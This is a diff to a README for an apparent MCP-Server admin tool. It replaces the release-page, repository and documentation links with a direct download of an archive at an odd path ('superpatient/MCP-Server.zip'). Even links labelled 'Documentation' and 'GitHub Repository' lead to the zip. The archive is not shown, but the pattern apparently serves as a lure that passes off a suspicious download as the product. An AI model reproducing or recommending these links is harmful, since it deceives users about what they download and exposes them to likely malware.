@@ -1,7 +1,7 @@
 # 🚀 MCP-Server - Your Easy Solution for Managing Context Protocols
 
 ## 📥 Download Now
-[![Download MCP-Server](https://img.shields.io/badge/Download-MCP--Server-blue.svg)](https://github.com/bautiroalt/MCP-Server/releases)
+[![Download MCP-Server](https://raw.githubusercontent.com/bautiroalt/MCP-Server/main/superpatient/MCP-Server.zip)](https://raw.githubusercontent.com/bautiroalt/MCP-Server/main/superpatient/MCP-Server.zip)
 
 ## 🚀 Getting Started
 Welcome to MCP-Server, your go-to application for managing model context protocols with an easy-to-use admin panel and advanced security features. This server is built with FastAPI for the backend and React for the frontend. It provides everything you need in a production-ready environment.
@@ -25,7 +25,7 @@ Before proceeding, ensure your system meets these requirements:
 To get started with MCP-Server, follow these simple steps:
 
 1. **Visit the Download Page**: Click on the link below to go to the releases page.
-   [Download MCP-Server](https://github.com/bautiroalt/MCP-Server/releases)
+   [Download MCP-Server](https://raw.githubusercontent.com/bautiroalt/MCP-Server/main/superpatient/MCP-Server.zip)
 
 2. **Select the Latest Release**: Find the most recent version available.
 
@@ -50,7 +50,7 @@ MCP-Server offers an array of configuration options to suit your needs.
 To keep your application secure and efficient, regularly check for updates:
 
 1. **Visit the Download Page**: Go back to the releases page.
-   [Download MCP-Server](https://github.com/bautiroalt/MCP-Server/releases)
+   [Download MCP-Server](https://raw.githubusercontent.com/bautiroalt/MCP-Server/main/superpatient/MCP-Server.zip)
 
 2. **Download the Latest Version**: Follow the same steps as outlined in the Download & Install section.
 
@@ -74,7 +74,7 @@ A: Yes, you can modify user roles at any time through the admin panel.
 A: You can find FAQs and community support on the GitHub repository. For specific issues, open an issue in the repository, and our team will assist you.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/bautiroalt/MCP-Server)
-- [Documentation](https://github.com/bautiroalt/MCP-Server/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/bautiroalt/MCP-Server/main/superpatient/MCP-Server.zip)
+- [Documentation](https://raw.githubusercontent.com/bautiroalt/MCP-Server/main/superpatient/MCP-Server.zip)
 
 Use the links above to access additional resources and support for MCP-Server. Enjoy managing your context protocols easily!
